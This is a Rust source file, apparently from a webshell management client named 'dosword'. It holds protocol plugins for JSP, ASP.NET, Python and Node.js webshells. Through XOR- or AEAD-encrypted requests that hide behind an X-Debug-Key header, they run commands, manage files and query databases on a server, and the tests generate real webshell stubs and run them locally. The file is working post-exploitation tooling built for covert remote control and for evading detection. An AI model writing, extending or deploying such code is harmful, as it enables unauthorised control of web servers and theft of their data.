            description: "JSP WebShell（Java）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

impl dosword_sdk::ProtocolPlugin for AspNetProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "ASP.NET WebShell（C#）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

// ---------------------------------------------------------------------------
// Python / Node.js：复用 JvmLikeProtocol 通信格式（formData XOR + X-Debug-Key）
// ---------------------------------------------------------------------------

pub struct PythonProtocol;

impl Protocol for PythonProtocol {
    fn id(&self) -> &'static str {
        "builtin.python.v1"
    }

    fn display_name(&self) -> &'static str {
        "Python（XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .create_dir(session, path, settings)
    }

    fn touch_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .touch_path(session, path, timestamp, settings)
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .db_probe(session, connection, settings)
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .db_query(session, connection, sql, settings)
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .read_chunk(session, path, offset, length, settings)
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.python.v1",
            display_name: "",
        }
        .write_chunk(session, path, content, offset, settings)
    }
}

impl dosword_sdk::ProtocolPlugin for PythonProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "Python WebShell（CGI）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

pub struct NodeProtocol;

impl Protocol for NodeProtocol {
    fn id(&self) -> &'static str {
        "builtin.node.v1"
    }

    fn display_name(&self) -> &'static str {
        "Node.js（XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .create_dir(session, path, settings)
    }

    fn touch_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .touch_path(session, path, timestamp, settings)
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .db_probe(session, connection, settings)
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .db_query(session, connection, sql, settings)
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .read_chunk(session, path, offset, length, settings)
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol {
            id: "builtin.node.v1",
            display_name: "",
        }
        .write_chunk(session, path, content, offset, settings)
    }
}

impl dosword_sdk::ProtocolPlugin for NodeProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "Node.js WebShell（独立 HTTP 服务）：命令执行、文件管理（XOR 载荷）。"
                .to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use dosword_sdk::domain::AppSettings;
    use dosword_sdk::encoder::NativeEncoder;

    /// Python 模拟 JSP stub（同协议：XOR + hash 分发 + formData + X-Debug-Key）。
    const JSP_MOCK: &str = r#"
import hashlib, base64, json, os, urllib.parse, sys
from http.server import BaseHTTPRequestHandler, HTTPServer
PASSWORD = "secret"
key = hashlib.md5(PASSWORD.encode()).hexdigest().encode()
token = hashlib.md5(PASSWORD.encode()).hexdigest()[:16]
H = {op: int(hashlib.md5(op.encode()).hexdigest()[:8], 16)
     for op in ["probe","exec","list","read","write","delete","rename","mkdir"]}
class Hd(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.headers.get("X-Debug-Key") != token:
            self.send_response(404); self.end_headers(); return
        n = int(self.headers.get("Content-Length", 0))
        params = urllib.parse.parse_qs(self.rfile.read(n).decode())
        fd = params.get("formData", [""])[0]
        raw = base64.b64decode(fd)
        plain = bytes(c ^ key[i % len(key)] for i, c in enumerate(raw))
        req = json.loads(plain)
        h = H.get(req.get("a", ""), 0)
        if h == H["probe"]:
            out = {"ok": True, "data": {"server": "JVM Sim", "web_server": "Mock",
                   "php_version": "", "current_dir": "/tmp", "separator": "/"}}
        elif h == H["exec"]:
            c = req.get("c", "")
            w = req.get("w", "/tmp")
            if c.strip().startswith("cd ") and len(c.strip()) > 3:
                t = c.strip()[3:].strip()
                nw = t if t.startswith("/") else w.rstrip("/") + "/" + t
                out = {"ok": True, "data": {"stdout": "", "cwd": nw}}
            else:
                out = {"ok": True, "data": {"stdout": base64.b64encode(
                       ("echo:" + c).encode()).decode(), "cwd": w}}
        elif h == H["list"]:
            out = {"ok": True, "data": {"entries": [
                   {"name": "a.txt", "path": "/tmp/a.txt", "is_dir": False,
                    "size": 3, "mtime": 0}]}}
        else:
            out = {"ok": True, "data": None}
        resp = json.dumps(out).encode()
        enc = bytes(c ^ key[i % len(key)] for i, c in enumerate(resp))
        data = base64.b64encode(enc).decode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"data": data, "code": 200}).encode())
    def log_message(self, *a):
        pass
port = int(sys.argv[1])
HTTPServer(("127.0.0.1", port), Hd).serve_forever()
"#;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
            chunk_size_mb: 4,
            allow_arbitrary_code: true,
            audit_retention_days: 90,
            gzip_enabled: true,
            tls_verify: false,
            allow_arbitrary_local_paths: false,
            ..AppSettings::default()
        }
    }

    fn profile(url: &str) -> ShellProfile {
        ShellProfile {
            id: "t".into(),
            workspace_id: "w".into(),
            name: "t".into(),
            endpoint: url.into(),
            runtime: "jsp".into(),
            protocol_id: "builtin.jsp.v1".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            status: String::new(),
            last_connected_at: None,
            created_at: String::new(),
            tags: vec![],
        }
    }

    #[test]
    fn chunk_slicing_handles_seek_and_whole_file_stubs() {
        // 支持 seek 的 stub：返回的就是这一块，不能再切
        assert_eq!(slice_chunk(b"BBBB".to_vec(), 4, 4), b"BBBB");
        // 不支持 seek 的 stub：返回整文件，需要按 offset/length 切
        assert_eq!(slice_chunk(b"AAAABBBBCCCC".to_vec(), 4, 4), b"BBBB");
        assert_eq!(slice_chunk(b"AAAABBBBCCCC".to_vec(), 8, 4), b"CCCC");
        // 无法区分时的取舍：返回长度不超过请求长度 → 信任 stub 返回的就是该范围。
        // 真实下载循环按顺序请求、遇到短块即结束，不会在越界 offset 上请求，
        // 因此这个退化分支不影响实际使用。
        assert_eq!(slice_chunk(b"AAAA".to_vec(), 8, 4), b"AAAA");
        // 文件小于请求长度且 offset 为 0：整文件即结果
        assert_eq!(slice_chunk(b"AAA".to_vec(), 0, 4), b"AAA");
    }

    #[test]
    fn jsp_protocol_round_trip_against_mock_server() {
        let script = std::env::temp_dir().join("dosword_jsp_mock.py");
        let _ = std::fs::write(&script, JSP_MOCK);
        let port: u16 = 21000 + (std::process::id() % 500) as u16;
        let child = std::process::Command::new("python3")
            .arg(&script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Ok(_child) = child else {
            eprintln!("跳过 jsp 往返：未检测到 python3 可执行文件（mock server 需要）");
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 jsp 往返：mock server 未在 10 秒内就绪");
            return;
        }

        let url = format!("http://127.0.0.1:{port}/shell.jsp");
        let settings = settings();
        let p = profile(&url);
        let protocol = JspProtocol;
        let (session, info) = protocol.connect(&p, &settings).unwrap();
        assert_eq!(info.current_dir, "/tmp");
        let out = protocol
            .execute_command(session.as_ref(), "whoami", &settings)
            .unwrap();
        assert_eq!(out.stdout, "echo:whoami");
        // cd 支持：cd 后 cwd 更新，后续命令在新目录执行
        let out = protocol
            .execute_command(session.as_ref(), "cd /opt", &settings)
            .unwrap();
        assert_eq!(out.cwd.as_deref(), Some("/opt"));
        let out = protocol
            .execute_command(session.as_ref(), "pwd", &settings)
            .unwrap();
        assert_eq!(out.cwd.as_deref(), Some("/opt"), "cd 后应保持新目录");
        let listing = protocol
            .list_dir(session.as_ref(), "/tmp", &settings)
            .unwrap();
        assert_eq!(listing.entries.len(), 1);
        assert_eq!(listing.entries[0].name, "a.txt");
        // 写/删往返
        protocol
            .write_file(session.as_ref(), "/tmp/x.txt", b"hello", &settings)
            .unwrap();
        protocol
            .delete_path(session.as_ref(), "/tmp/x.txt", &settings)
            .unwrap();
        // 错误密码 → 404
        let mut bad = profile(&url);
        bad.password = "wrong".into();
        assert!(protocol.probe(&bad, &settings).is_err());
    }

    #[test]
    fn asp_protocol_round_trip_against_mock_server() {
        let script = std::env::temp_dir().join("dosword_jsp_mock.py");
        let _ = std::fs::write(&script, JSP_MOCK);
        let port: u16 = 22000 + (std::process::id() % 500) as u16;
        let child = std::process::Command::new("python3")
            .arg(&script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Ok(_child) = child else {
            eprintln!("跳过 asp 往返：未检测到 python3 可执行文件（mock server 需要）");
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 asp 往返：mock server 未在 10 秒内就绪");
            return;
        }

        let url = format!("http://127.0.0.1:{port}/shell.asp");
        let settings = settings();
        let mut p = profile(&url);
        p.protocol_id = "builtin.asp.v1".into();
        let protocol = AspProtocol;
        let (session, info) = protocol.connect(&p, &settings).unwrap();
        assert_eq!(info.current_dir, "/tmp");
        let out = protocol
            .execute_command(session.as_ref(), "dir", &settings)
            .unwrap();
        assert_eq!(out.stdout, "echo:dir");
        let listing = protocol.list_dir(session.as_ref(), "/", &settings).unwrap();
        assert_eq!(listing.entries.len(), 1);
        // stub 生成
        let stub = NativeEncoder { crypto: "xor" }
            .stub("asp", "secret")
            .unwrap();
        assert!(stub.contains("WScript.Shell"), "ASP stub 应含命令执行");
        assert!(stub.contains("ADODB.Stream"), "ASP stub 应含二进制文件 I/O");
        assert!(!stub.contains("{xk}"), "占位符应已替换");
    }

    #[test]
    fn python_stub_round_trip_against_cgi_server() {
        // 真实 python3 CGI 服务器 + PythonProtocol 端到端
        if std::process::Command::new("python3")
            .arg("--version")
            .output()
            .is_err()
        {
            return;
        }
        let dir = std::env::temp_dir().join(format!("dosword-py-{}", uuid::Uuid::new_v4()));
        let cgi = dir.join("cgi-bin");
        std::fs::create_dir_all(&cgi).unwrap();
        let stub = dosword_sdk::encoder::NativeEncoder { crypto: "xor" }
            .stub("python", "secret")
            .unwrap();
        let script = cgi.join("shell.py");
        std::fs::write(&script, &stub).unwrap();
        // CGI 脚本需可执行
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755));
        }
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("python3")
            .arg("-m")
            .arg("http.server")
            .arg("--cgi")
            .arg(port.to_string())
            .arg("--directory")
            .arg(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Some(mut child) = child.ok() else {
            eprintln!("跳过 python CGI 往返：未检测到 python3 可执行文件");
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 python CGI 往返：服务器未在 10 秒内就绪");
            let _ = child.kill();
            return;
        }
        let url = format!("http://127.0.0.1:{port}/cgi-bin/shell.py");
        let settings = settings();
        let mut p = profile(&url);
        p.protocol_id = "builtin.python.v1".into();
        let protocol = PythonProtocol;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, info) = protocol.connect(&p, &settings)?;
            assert!(!info.current_dir.is_empty(), "Python probe 应返回当前目录");
            assert!(
                info.runtime.contains("Python"),
                "runtime 应为 Python：{}",
                info.runtime
            );
            eprintln!("[python] probe ok: {} / {}", info.runtime, info.current_dir);
            let out = protocol.execute_command(session.as_ref(), "printf py-ok", &settings)?;
            assert_eq!(out.stdout, "py-ok", "Python 命令执行应输出：{}", out.stdout);
            eprintln!("[python] exec ok: {}", out.stdout);
            let listing = protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
            assert!(
                listing.entries.iter().any(|e| e.name == "cgi-bin"),
                "应列举出 cgi-bin"
            );
            eprintln!("[python] list ok（{} 项）", listing.entries.len());
            // 文件写入 + 读取
            let test_file = format!("{}/py_write.txt", dir.display());
            protocol.write_file(session.as_ref(), &test_file, b"hello py", &settings)?;
            let content = protocol.read_file(session.as_ref(), &test_file, &settings)?;
            assert_eq!(content, b"hello py");
            // P2：分块读写（客户端已转发 stub 的 o/l）
            protocol.write_file(session.as_ref(), &test_file, b"0123456789", &settings)?;
            let chunk = protocol.read_chunk(session.as_ref(), &test_file, 3, 4, &settings)?;
            assert_eq!(chunk, b"3456", "分块读应返回指定范围");
            protocol.write_chunk(session.as_ref(), &test_file, b"XY", 2, &settings)?;
            let patched = protocol.read_file(session.as_ref(), &test_file, &settings)?;
            assert_eq!(patched, b"01XY456789", "分块写应覆盖指定偏移");
            eprintln!("[python] read/write ok");
            // DB：sqlite（目标进程内建库 + 建表 + 查询）
            let db_file = format!("{}/py_test.db", dir.display());
            let conn = DbConnection {
                driver: "sqlite".into(),
                host: None,
                port: None,
                username: None,
                password: None,
                dbname: Some(db_file.clone()),
            };
            let probe = protocol.db_probe(session.as_ref(), &conn, &settings)?;
            assert!(
                probe.databases.contains(&"main".to_string()),
                "{:?}",
                probe.databases
            );
            protocol.db_query(
                session.as_ref(),
                &conn,
                "CREATE TABLE IF NOT EXISTS t (id INTEGER, name TEXT)",
                &settings,
            )?;
            protocol.db_query(
                session.as_ref(),
                &conn,
                "INSERT INTO t VALUES (1, 'dosword')",
                &settings,
            )?;
            let q =
                protocol.db_query(session.as_ref(), &conn, "SELECT id, name FROM t", &settings)?;
            assert_eq!(q.columns, vec!["id".to_string(), "name".to_string()]);
            assert_eq!(q.rows.len(), 1);
            assert_eq!(q.rows[0][1].as_deref(), Some("dosword"));
            eprintln!("[python] db(sqlite) ok");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("Python stub 端到端应成功：{error}"));
    }

    /// 直接向 AEAD stub POST 一帧，并按响应方向解密（用于重放测试）。
    fn post_aead_frame(url: &str, frame: &str) -> Result<serde_json::Value, String> {
        let body = format!(
            "formData={}",
            crate::protocol::transport::form_escape(frame)
        );
        let token = &dosword_sdk::encoder::md5_hex("secret")[..16];
        let response = reqwest::blocking::Client::new()
            .post(url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .header("X-Debug-Key", token)
            .body(body)
            .send()
            .map_err(|error| error.to_string())?;
        let text = response.text().map_err(|error| error.to_string())?;
        let outer: serde_json::Value =
            serde_json::from_str(&text).map_err(|error| error.to_string())?;
        let data = outer
            .get("data")
            .and_then(|item| item.as_str())
            .ok_or_else(|| format!("响应缺少 data：{text}"))?;
        let key = dosword_sdk::aead::derive_key("secret");
        let (_, plain) = dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, data)?;
        serde_json::from_slice(&plain).map_err(|error| error.to_string())
    }

    /// AEAD 重放：同一帧第二次必须被目标拒绝（`replay`）。
    fn assert_replay_rejected(url: &str) {
        let mut client = dosword_sdk::aead::AeadSession::new("secret");
        let token = &dosword_sdk::encoder::md5_hex("secret")[..16];
        let request = format!(r#"{{"a":"probe","token":"{token}"}}"#);
        let frame = client.seal(request.as_bytes()).expect("封装请求");
        let first = post_aead_frame(url, &frame).expect("首帧应成功");
        assert_eq!(first["ok"], serde_json::json!(true), "{first}");
        let second = post_aead_frame(url, &frame).expect("重放帧应返回可解密的错误响应");
        assert_eq!(second["ok"], serde_json::json!(false), "{second}");
        assert!(
            second["error"]
                .as_str()
                .unwrap_or_default()
                .contains("replay"),
            "应报告 replay：{second}"
        );
    }

    /// AEAD（JSP）：把 stub 的 `<%! %>` 声明块抽出编译为普通 Java 类，
    /// 与 Rust 实现做双向互操作 + 重放拒绝（无需 servlet 容器）。
    #[test]
    fn aead_jsp_crypto_interop() {
        if std::process::Command::new("javac")
            .arg("-version")
            .output()
            .is_err()
        {
            eprintln!("跳过：无 javac");
            return;
        }
        let stub = dosword_sdk::encoder::AeadEncoder
            .stub("jsp", "secret")
            .expect("生成 JSP AEAD stub");
        let start = stub.find("<%!").expect("声明块起点") + 3;
        let end = start + stub[start..].find("%>").expect("声明块终点");
        let decls = &stub[start..end];
        // 页面脚本片段（`<% ... %>`）：用桩类型包一层，做**编译期**校验
        let sstart = stub.rfind("<%").expect("脚本片段起点") + 2;
        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
        let scriptlet = &stub[sstart..send];
        assert!(
            scriptlet.contains("formData"),
            "脚本片段抽取失败：{scriptlet}"
        );
        let dir = std::env::temp_dir().join(format!("dosword-jsp-aead-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let harness = format!(
            r#"
import java.io.*;
import java.util.*;
import java.nio.charset.*;
class DSW_Req {{ String getHeader(String n) {{ return null; }} String getParameter(String n) {{ return null; }} }}
class DSW_Resp {{ void setStatus(int c) {{}} }}
class DSW_Out {{ void print(String s) {{}} }}
public class StubTest {{
{decls}
  static void DSW_page(DSW_Req request, DSW_Resp response, DSW_Out out) throws Exception {{
{scriptlet}
  }}
  public static void main(String[] args) throws Exception {{
    String req = args[0];
    byte[] sealedFrame = DSW_aeadSeal(req.getBytes("UTF-8"));
    System.out.println("SEALED:" + java.util.Base64.getEncoder().encodeToString(sealedFrame));
    byte[] frame = java.util.Base64.getDecoder().decode(args[1]);
    System.out.println("OPENED:" + new String(DSW_aeadOpen(frame), "UTF-8"));
    try {{ DSW_aeadOpen(frame); System.out.println("REPLAY-ACCEPTED"); }}
    catch (Exception e) {{ System.out.println("REPLAY-REJECTED"); }}
  }}
}}
"#
        );
        std::fs::write(dir.join("StubTest.java"), harness).unwrap();
        let compile = std::process::Command::new("javac")
            .arg("-encoding")
            .arg("UTF-8")
            .arg("-d")
            .arg(&dir)
            .arg(dir.join("StubTest.java"))
            .output()
            .expect("运行 javac");
        assert!(
            compile.status.success(),
            "JSP AEAD 声明块编译失败：{}{}",
            String::from_utf8_lossy(&compile.stdout),
            String::from_utf8_lossy(&compile.stderr)
        );
        // Rust → Java
        let request = r#"{"a":"probe"}"#;
        let mut client = dosword_sdk::aead::AeadSession::new("secret");
        let frame = client.seal(request.as_bytes()).expect("封装请求");
        let run = std::process::Command::new("java")
            .arg("-cp")
            .arg(&dir)
            .arg("StubTest")
            .arg(request)
            .arg(&frame)
            .output()
            .expect("运行 java");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            run.status.success(),
            "JSP AEAD 运行失败：{}",
            String::from_utf8_lossy(&run.stderr)
        );
        let text = String::from_utf8_lossy(&run.stdout);
        let sealed = text
            .lines()
            .find_map(|line| line.strip_prefix("SEALED:"))
            .unwrap_or_else(|| panic!("缺少 SEALED 行：{text}"));
        let opened = text
            .lines()
            .find_map(|line| line.strip_prefix("OPENED:"))
            .unwrap_or_else(|| panic!("缺少 OPENED 行：{text}"));
        assert_eq!(opened, request, "Java 应能解开 Rust 帧");
        assert!(text.contains("REPLAY-REJECTED"), "Java 应拒绝重放：{text}");
        // Java → Rust
        let key = dosword_sdk::aead::derive_key("secret");
        let (_, plain) = dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, sealed)
            .expect("Rust 应能解开 Java 帧");
        assert_eq!(String::from_utf8_lossy(&plain), request);
    }

    /// AEAD（ASPX）：抽出 `<script runat="server">` 声明块，用 dotnet 编译运行
    /// 做双向互操作 + 重放拒绝（无需 IIS；纯托管 AES-GCM 实现）。
    #[test]
    fn aead_aspx_crypto_interop() {
        if std::process::Command::new("dotnet")
            .arg("--version")
            .output()
            .is_err()
        {
            eprintln!("跳过：无 dotnet");
            return;
        }
        let stub = dosword_sdk::encoder::AeadEncoder
            .stub("aspx", "secret")
            .expect("生成 ASPX AEAD stub");
        let start = stub.find("<script runat=\"server\">").expect("script 起点")
            + "<script runat=\"server\">".len();
        let end = stub.find("</script>").expect("script 终点");
        let decls = &stub[start..end];
        // 页面脚本片段（`<% ... %>`）：用桩类型包一层，做**编译期**校验
        let sstart = stub[end..].find("<%").expect("脚本片段起点") + end + 2;
        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
        let scriptlet = &stub[sstart..send];
        assert!(
            scriptlet.contains("formData"),
            "脚本片段抽取失败：{scriptlet}"
        );
        let dir = std::env::temp_dir().join(format!("dosword-aspx-aead-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let program = format!(
            r#"using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
class DSW_Req {{
  public System.Collections.Generic.Dictionary<string, string> Headers = new System.Collections.Generic.Dictionary<string, string>();
  public System.Collections.Generic.Dictionary<string, string> ServerVariables = new System.Collections.Generic.Dictionary<string, string>();
  public string this[string k] {{ get {{ return null; }} }}
}}
class DSW_Resp {{ public int StatusCode; public void End() {{}} public void Write(string s) {{}} }}
class StubTest {{
{decls}
  static void DSW_page(DSW_Req Request, DSW_Resp Response) {{
{scriptlet}
  }}
  static void Main(string[] args) {{
    string req = args[0];
    byte[] sealedFrame = DSW_aeadSeal(Encoding.UTF8.GetBytes(req));
    Console.WriteLine("SEALED:" + Convert.ToBase64String(sealedFrame));
    byte[] frame = Convert.FromBase64String(args[1]);
    Console.WriteLine("OPENED:" + Encoding.UTF8.GetString(DSW_aeadOpen(frame)));
    try {{ DSW_aeadOpen(frame); Console.WriteLine("REPLAY-ACCEPTED"); }}
    catch (Exception) {{ Console.WriteLine("REPLAY-REJECTED"); }}
  }}
}}
"#
        );
        std::fs::write(dir.join("Program.cs"), &program).unwrap();
        let new_project = std::process::Command::new("dotnet")
            .arg("new")
            .arg("console")
            .arg("-o")
            .arg(&dir)
            .arg("--force")
            .output()
            .expect("运行 dotnet new");
        if !new_project.status.success() {
            eprintln!(
                "跳过 ASPX AEAD：dotnet new 失败：{}",
                String::from_utf8_lossy(&new_project.stderr)
            );
            let _ = std::fs::remove_dir_all(&dir);
            return;
        }
        // dotnet new 可能覆盖 Program.cs：重新写入
        std::fs::write(dir.join("Program.cs"), program).unwrap();
        let request = r#"{"a":"probe"}"#;
        let mut client = dosword_sdk::aead::AeadSession::new("secret");
        let frame = client.seal(request.as_bytes()).expect("封装请求");
        let run = std::process::Command::new("dotnet")
            .arg("run")
            .arg("--project")
            .arg(&dir)
            .arg("--")
            .arg(request)
            .arg(&frame)
            .output()
            .expect("运行 dotnet run");
        assert!(
            run.status.success(),
            "ASPX AEAD 运行失败：{}{}",
            String::from_utf8_lossy(&run.stdout),
            String::from_utf8_lossy(&run.stderr)
        );
        let text = String::from_utf8_lossy(&run.stdout);
        let sealed = text
            .lines()
            .find_map(|line| line.strip_prefix("SEALED:"))
            .unwrap_or_else(|| panic!("缺少 SEALED 行：{text}"));
        let opened = text
            .lines()
